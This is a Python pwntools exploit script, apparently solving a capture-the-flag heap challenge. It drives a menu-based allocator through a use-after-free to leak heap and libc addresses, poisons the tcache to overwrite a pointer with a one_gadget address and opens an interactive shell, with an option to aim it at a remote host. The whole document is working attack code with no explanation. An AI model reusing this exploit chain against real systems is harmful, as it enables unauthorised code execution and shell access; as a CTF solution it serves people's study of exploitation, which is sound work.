#!/usr/bin/env python3
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

elf = context.binary = ELF('task_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context(terminal=['tmux', 'split-window', '-h'])
context.log_level = 'info'

gs = '''
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(elf.path, *a, **kw)

def malloc(size):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b':', size)

def free(index):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b':', f"{index}".encode())

def edit(index, data):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b':', f"{index}".encode())
    io.sendlineafter(b':', data)

def show(index):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b':', f"{index}".encode())
    io.recvline()
    return io.recvline().rstrip()

def magic():
    io.sendlineafter(b'>>', b"17")

if __name__=='__main__':
    io = start()
    io.timeout = 0.1

    malloc(b"8")
    free(0)
    edit(0, b"A"*8)
    heap_leak = unpack(show(0)[16:].ljust(8, b"\x00"))-0x10
    info(f"HEAP ADDR: {hex(heap_leak)}")
    edit(0, pack(heap_leak+0x50))
    malloc(b"8")
    malloc(b"8")
    edit(2, pack(elf.got.malloc))
    malloc(b"8")
    libc_leak = unpack(show(2)[8:].ljust(8, b"\x00"))
    libc.address = libc_leak - libc.sym.__GI___libc_malloc
    info(f"LIBC ADDR: {hex(libc.address)}")
    edit(2, pack(elf.sym.magic_library))
    malloc(b"8")
    edit(4, pack(libc.address + 0x10a2fc))
    magic()

    io.interactive()